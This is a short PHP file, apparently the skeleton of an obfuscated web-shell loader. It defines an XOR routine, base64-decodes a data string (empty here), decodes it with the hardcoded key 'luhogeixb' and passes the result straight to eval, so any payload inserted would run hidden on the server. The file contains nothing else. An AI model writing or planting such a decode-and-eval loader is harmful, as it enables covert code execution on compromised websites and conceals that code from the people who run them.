<?php
function b($input, $key) {

    $inputLen = strlen($input);
    $keyLen = strlen($key);

    if ($inputLen <= $keyLen) {
        return $input ^ $key;
    }

    for ($i = 0; $i < $inputLen; ++$i) {
        $input[$i] = $input[$i] ^ $key[$i % $keyLen];
    }
    return $input;
}
$data = "";
$key = "luhogeixb";
$decoded = b(base64_decode($data),$key);
eval ($decoded);
